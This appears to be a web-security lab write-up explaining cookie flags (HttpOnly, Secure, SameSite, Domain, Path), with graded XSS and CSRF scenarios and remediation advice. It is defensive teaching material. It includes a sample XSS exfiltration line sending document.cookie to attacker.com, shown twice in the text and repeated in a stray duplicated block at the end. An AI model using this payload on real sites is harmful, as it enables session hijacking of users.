
# 🌐 Lab 09: Cookie Security Attributes (Flags) & Session Scope

![Category](https://img.shields.io/badge/Category-Web_Security-blue?style=flat-square)
![Lab](https://img.shields.io/badge/Lab-09-orange?style=flat-square)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen?style=flat-square)

## 📌 Overview

When a web server transmits a Session ID to the browser via the `Set-Cookie` HTTP header, it does not merely send a key-value pair. It attaches security flags and scope attributes that dictate **how, when, and where** the browser is permitted to store and transmit the cookie. Understanding these security flags is essential for auditing an application's exposure to **XSS-based Session Hijacking** and **Cross-Site Request Forgery (CSRF)**.

---

## 📊 Quick Reference Table

| Cookie Flag / Attribute | Core Purpose | Primary Security Impact |
| :--- | :--- | :--- |
| **`HttpOnly`** | Blocks client-side script access (`document.cookie`). | Protects session tokens from direct theft via XSS. |
| **`Secure`** | Restricts cookie transmission strictly to HTTPS connections. | Prevents cleartext network sniffing (MiTM / Wi-Fi eavesdropping). |
| **`SameSite=Strict`** | Completely blocks cookie transmission on all cross-site requests. | Maximum CSRF defense; introduces usability friction. |
| **`SameSite=Lax`** | Blocks background cross-site requests; allows top-level GET navigations. | Default browser balance between security and user experience. |
| **`SameSite=None`** | Sends cookies across all cross-site requests (Requires `Secure`). | Leaves application vulnerable to CSRF unless mitigated elsewhere. |
| **`Domain`** | Specifies authorized subdomains allowed to receive the cookie. | Controls cross-subdomain token exposure. |
| **`Path`** | Restricts cookie transmission to designated URL path prefixes. | Scopes session handling to specific directory structures. |

---

## 🛠️ Detailed Technical Breakdown

### 1. The `HttpOnly` Flag

> [!NOTE]
> **Concept:** Prevents client-side scripts (such as JavaScript's `document.cookie`) from accessing the cookie inside the browser.

> [!IMPORTANT]
> **Security Significance:** Designed to protect session tokens from exfiltration in the event of a Cross-Site Scripting (XSS) vulnerability.

#### ⚙️ How It Works:
* **Without `HttpOnly`:** If an attacker injects malicious JavaScript, the script can execute `document.cookie`, extract the `Session ID`, and immediately exfiltrate it to the attacker's server (`http://attacker.com/?cookie=` + `document.cookie`).
* **With `HttpOnly`:** The browser includes the cookie automatically in outgoing HTTP requests, but JavaScript execution engines are strictly blocked from reading it via `document.cookie`, preventing direct token theft.


```

+-----------------------------------------------------------------------+
|                            Browser Memory                             |
|                                                                       |
|   Cookie: PHPSESSID=xyz123 (HttpOnly)                                 |
|                                                                       |
|   [ Client-Side JS Execution ] ----(document.cookie)----> [ BLOCKED ] |
|   [ HTTP Request Engine ] --------(GET /api)------------> [ ALLOWED ] |
+-----------------------------------------------------------------------+

```

---

### 2. The `Secure` Flag

> [!NOTE]
> **Concept:** Mandates that the browser must only transmit the cookie over encrypted TLS/HTTPS connections.

> [!WARNING]
> **Security Significance:** Protects session traffic against Network Sniffing and Man-in-the-Middle (MiTM) attacks.
> 
> **Scenario:** If a user attempts to open an application over an unencrypted connection (`http://target.com`), the browser will refuse to attach the `Secure` cookie to the request, preventing an eavesdropper on a local Wi-Fi network from sniffing the Session ID out of cleartext traffic.

---

### 3. The `SameSite` Attribute (CSRF Defense Line)

> [!NOTE]
> **Concept:** Controls cookie transmission behavior when requests originate from third-party, cross-site origins (`Cross-Site Requests`).

| Attribute Value | Technical Behavior | Security & Usability Impact |
| :--- | :--- | :--- |
| **`Strict`** | Completely blocks cookie transmission on any request originating from another site (even if the user clicks a standard hyperlink leading to the target site). | Absolute CSRF protection, but may inconvenience users by forcing re-authentication when following external links. |
| **`Lax`** *(Default in Modern Browsers)* | Blocks cookies on suspicious background cross-site requests (such as `POST` forms, `<iframe>`, or `fetch()`), but allows cookies on direct top-level navigation triggered by standard `GET` requests (e.g., clicking a link). | Optimal balance between security and user convenience. |
| **`None`** | Transmits the cookie on all cross-site requests without restriction. **Mandatory requirement:** Must be paired with the `Secure` flag (`SameSite=None; Secure`). | Leaves the site fully exposed to CSRF unless independent defenses (such as Anti-CSRF Tokens) are present. |

---

### 4. Cookie Scope Controls: `Domain` & `Path`

> [!NOTE]
> **Concept:** Determines where within the target application's infrastructure the browser is authorized to send the cookie.

* **`Domain` Attribute:**
  * Specifies which subdomains can receive the cookie.
  * **Example:** Setting `Domain=.target.com` ensures the cookie is attached to requests destined for `app.target.com` and `admin.target.com`.
* **`Path` Attribute:**
  * Restricts cookie transmission to specific URL path structures.
  * **Example:** Setting `Path=/admin` ensures the browser sends the cookie only when navigating pages starting with `/admin` (e.g., `/admin/dashboard`).

---

## 🧪 Practical Scenarios, Questions & Technical Evaluations

### 🔹 Scenario 1: Reflected XSS & `HttpOnly` Cookie Bypasses

> [!CAUTION]
> **Field Scenario:**  
> During an assessment, you discover a Reflected XSS vulnerability. You attempt to exploit it to steal cookies using `fetch('http://attacker.com/?cookie=' + document.cookie)`, but the returned value contains no Session ID. Inspecting the `Set-Cookie` header in Burp Suite reveals:
> ```http
> Set-Cookie: PHPSESSID=xyz12345; path=/; Secure; HttpOnly; SameSite=Lax
> ```

* **Questions:**
  1. What technical mechanism prevented reading the Session ID via JavaScript?
  2. Does this cookie configuration render the XSS vulnerability harmless, or can an attacker still exploit it through other means?

* **Student Analysis:**
  > 1. **Technical Cause:** The presence of the `HttpOnly` flag prevents JavaScript from accessing the cookie directly via `document.cookie`.
  > 2. **Exploitability despite `HttpOnly`:** XSS remains extremely dangerous for a core reason:  
  >    When JavaScript executes internal same-origin requests (e.g., `fetch('/change-password')`), the browser **automatically attaches** the `HttpOnly` cookie to the outgoing request!
  > 
  > **XSS Attack Vectors Without Cookie Theft:**
  > * **Forced Actions:** Performing state-changing actions on behalf of the victim (e.g., changing email address, changing password, or executing funds transfers inside the app).
  > * **Sensitive Data Exfiltration:** Reading the current page DOM content (e.g., private user emails, inline CSRF Tokens) and exfiltrating it to the attacker's server.
  > * **Virtual Phishing:** Injecting a fake login form over the victim's current page to capture their real credentials.

* **Technical Evaluation:**
  * **Verdict:** ✅ **100% Accurate Security Analysis.**
  * **Breakdown:** `HttpOnly` protects token confidentiality from direct script extraction, but **does not neutralize XSS**. Because XSS grants arbitrary script execution within the victim's authenticated browser context, the attacker can perform any action the victim is authorized to do.

---

### 🔹 Scenario 2: CSRF Risk under `SameSite=Lax` & GET Operations

> [!CAUTION]
> **Field Scenario:**  
> While auditing `https://target-bank.com`, you observe the server assigns session cookies with `SameSite=Lax`. The application uses no Anti-CSRF Tokens, relying entirely on `SameSite=Lax` for CSRF defense.  
> Inspecting the "Update Phone Number" feature reveals the server processes state-changing requests via `GET`:
> ```http
> GET /account/update-phone?mobile=0500000000 HTTP/1.1
> Host: target-bank.com
> ```
> An attacker creates a malicious site and lures an authenticated victim into clicking a direct link pointing to this URL.

* **Questions:**
  1. Will the victim's browser attach the session cookie (`PHPSESSID`) when clicking the link to navigate to the endpoint, or will `SameSite=Lax` block it?
  2. Based on your answer, is the developer correct in relying solely on `SameSite=Lax` for CSRF protection in this scenario? Why?

* **Student Analysis:**
  > 1. **Cookie Transmission:** Yes, the session cookie will be attached. It was not sent via external JavaScript, but rather via a standard top-level `GET` navigation from an authenticated session. `SameSite=Lax` permits cookies on standard top-level `GET` navigations.
  > 2. **Developer Assessment:** No, the developer is wrong. Anti-CSRF Tokens must be implemented.

* **Technical Security Breakdown & Evaluation:**
  * **Verdict:** ✅ **100% Correct Technical Analysis.**
  * **Q1 Evaluation:** `SameSite=Lax` blocks cookies on cross-site background requests (such as `POST` forms via JS or `<iframe>` embeds), but explicitly permits cookies on top-level navigations (such as clicking an `<a>` link). When the victim clicks the link, the browser attaches the session cookie, and the phone number is updated successfully.
  * **Q2 Evaluation:** The developer committed two critical security flaws:
    1. **Flaw 1:** Allowed a state-changing operation to be executed via an idempotent HTTP method (`GET`) instead of `POST`, `PUT`, or `DELETE`.
    2. **Flaw 2:** Relied entirely on `SameSite=Lax` as a replacement for Anti-CSRF Tokens.
  * **Remediation:** Convert state-changing endpoints to `POST` requests and enforce cryptographically unpredictable, per-session **Anti-CSRF Tokens**.

```
#### ⚙️ How It Works:
* **Without `HttpOnly`:** If an attacker injects malicious JavaScript, the script can execute `document.cookie`, extract the `Session ID`, and immediately exfiltrate it to the attacker's server (`http://attacker.com/?cookie=` + `document.cookie`).
* **With `HttpOnly`:** The browser includes the cookie automatically in outgoing HTTP requests, but JavaScript execution engines are strictly blocked from reading it via `document.cookie`, preventing direct token theft.
